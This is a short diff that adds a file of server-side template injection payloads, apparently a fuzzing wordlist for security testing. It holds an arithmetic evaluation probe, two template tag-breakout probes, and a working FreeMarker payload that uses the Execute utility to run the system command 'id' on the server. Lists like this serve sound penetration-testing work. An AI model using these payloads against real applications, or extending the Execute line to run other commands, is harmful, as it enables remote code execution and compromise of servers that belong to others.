@@ -1,0 +1,4 @@
+${7*7}
+username<tag>
+username}}<tag>
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
